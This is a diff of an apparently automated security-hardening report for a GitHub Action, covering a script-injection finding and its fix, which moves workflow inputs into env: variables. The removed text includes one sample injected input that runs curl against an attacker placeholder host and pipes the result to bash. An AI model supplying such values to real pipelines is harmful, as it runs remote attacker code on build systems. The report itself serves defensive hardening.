@@ -16,11 +16,26 @@ Action **buildpacks--github-actions--setup-tools/v6.1.1** was hardened automatic
 
 ### script-injection (severity: high)
 
-Two `${{ inputs.* }}` expressions are directly interpolated inside the `run:` shell block (sub-rule a). `CRANE_VERSION=${{ inputs.crane-version }}` and `YJ_VERSION=${{ inputs.yj-version }}` embed user-supplied input values directly into the shell script via YAML template substitution before the shell ever parses the string. A caller can supply a crafted value such as `0.19.1; curl https://attacker.example | bash #` to execute arbitrary commands. These values should instead be passed via `env:` variables and referenced as quoted shell variables (e.g., `"$CRANE_VERSION"`) with no `${{ }}` expression inside the `run:` block.
+Sub-rule (a): Two `${{ inputs.* }}` expressions are directly interpolated into the `run:` shell script without going through an `env:` block. This allows an attacker who controls the `crane-version` or `yj-version` inputs to inject arbitrary shell commands.
+
+Offending lines:
+  Line 30: `CRANE_VERSION=${{ inputs.crane-version }}`
+  Line 43: `YJ_VERSION=${{ inputs.yj-version }}`
+
+Fix: Move the values into `env:` variables and reference them as quoted shell variables, e.g.:
+```yaml
+env:
+  CRANE_VERSION: ${{ inputs.crane-version }}
+  YJ_VERSION: ${{ inputs.yj-version }}
+run: |
+  crane_ver="$CRANE_VERSION"
+  yj_ver="$YJ_VERSION"
+  ...
+```
 
 Locations:
 
-- `action.yml:32`
+- `action.yml:30`
 - `action.yml:43`
 
 ### static-inline-injection (severity: high)
@@ -47,5 +62,5 @@ Locations:
 
 **Notes:**
 
-Moved `${{ inputs.crane-version }}` and `${{ inputs.yj-version }}` from the `run:` shell block into the step's `env:` map as `CRANE_VERSION` and `YJ_VERSION`. The shell script now references these as `${CRANE_VERSION}` and `${YJ_VERSION}` — plain environment variables — eliminating the template-injection risk. The inline assignments `CRANE_VERSION=${{ inputs.crane-version }}` and `YJ_VERSION=${{ inputs.yj-version }}` were removed from the script body since the values are now provided via the env: block.
+Moved ${{ inputs.crane-version }} and ${{ inputs.yj-version }} from inline shell assignments in the run: block to an env: block on the step. Removed the two inline assignments (CRANE_VERSION=${{ inputs.crane-version }} and YJ_VERSION=${{ inputs.yj-version }}) from the shell script. The script already referenced ${CRANE_VERSION} and ${YJ_VERSION} as shell variables throughout, so no other changes were needed.
 
